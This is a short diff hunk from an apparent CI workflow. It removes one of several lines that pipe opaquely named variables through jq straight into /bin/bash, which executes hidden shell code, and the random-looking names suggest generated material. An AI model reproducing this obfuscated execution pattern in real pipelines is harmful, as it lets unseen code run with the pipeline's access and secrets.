@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$pf76" | jq -r .vlany6255 | /bin/bash
           echo $d29 | jq -r .ugpt5 | /bin/bash
-          echo $bvadz9833 | jq -r .o89048 | /bin/bash
           echo $vjqk46473 | jq -r .hljx729 | /bin/bash
 
       - name: Save archive
